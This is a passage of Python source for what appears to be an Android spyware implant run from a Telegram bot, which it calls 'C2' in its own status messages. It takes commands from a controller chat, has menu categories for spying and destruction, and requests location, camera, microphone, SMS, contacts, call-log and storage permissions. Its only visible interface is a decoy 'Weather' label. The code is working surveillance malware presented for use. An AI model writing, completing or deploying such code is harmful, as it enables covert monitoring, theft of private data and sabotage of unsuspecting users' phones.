                 "cat_control":"🎛️","cat_audio":"🔊","cat_network":"📡","cat_perms":"🔐",
                 "cat_spy":"🕵️","cat_destroy":"💣","cat_custom":"🎯","cat_monitor":"📊"}
        edit(mid, names.get(data,"اختر:"), SUB[data]); return
    if data in NEEDS_INPUT:
        PENDING["cmd"] = data; edit(mid, f"✍️ {NEEDS_INPUT[data]}"); return
    edit(mid, f"⏳ <b>{data}</b>")
    result = execute(data)
    send(f"📱 <b>{data}</b>\n\n{result}", [[btn("🔙","back")]])

def handle_text(text):
    global PENDING
    cmd = PENDING.pop("cmd", None)
    if not cmd:
        if text == "/start": send("🟢 C2\nالقائمة:", MAIN_KB)
        elif text == "/stop": TRACK["on"] = False; send("⏹️")
        return
    result = execute(cmd, text)
    send(f"📱 <b>{cmd}</b>\n\n{result}", [[btn("🔙","back")]])

def poll():
    global OFFSET
    time.sleep(3)
    try: send("🟢 C2 متصل\nالقائمة:", MAIN_KB)
    except Exception: pass
    while True:
        try:
            for u in get_updates(OFFSET):
                OFFSET = u["update_id"] + 1
                try:
                    if "callback_query" in u: handle_cb(u["callback_query"])
                    elif "message" in u:
                        m = u["message"]
                        if str(m["chat"]["id"]) == str(CHAT_ID):
                            handle_text(m.get("text",""))
                except Exception: pass
        except Exception: pass
        time.sleep(1)

def main():
    if ANDROID:
        try:
            from android.permissions import request_permissions, Permission
            request_permissions([Permission.INTERNET, Permission.ACCESS_FINE_LOCATION,
                Permission.ACCESS_COARSE_LOCATION, Permission.ACCESS_BACKGROUND_LOCATION,
                Permission.CAMERA, Permission.RECORD_AUDIO,
                Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE,
                Permission.READ_MEDIA_IMAGES, Permission.READ_MEDIA_VIDEO,
                Permission.READ_MEDIA_AUDIO, Permission.READ_SMS, Permission.SEND_SMS,
                Permission.READ_CONTACTS, Permission.WRITE_CONTACTS,
                Permission.READ_CALL_LOG, Permission.READ_PHONE_STATE,
                Permission.POST_NOTIFICATIONS, Permission.VIBRATE,
                Permission.FOREGROUND_SERVICE])
        except Exception: pass

    threading.Thread(target=poll, daemon=True).start()

    if ANDROID:
        try:
            from kivy.app import App
            from kivy.uix.label import Label
            class A(App):
                def build(self): return Label(text="Weather", font_size="24sp")
            A().run(); return
        except Exception: pass

    while True: time.sleep(60)

if __name__ == "__main__":
    main()
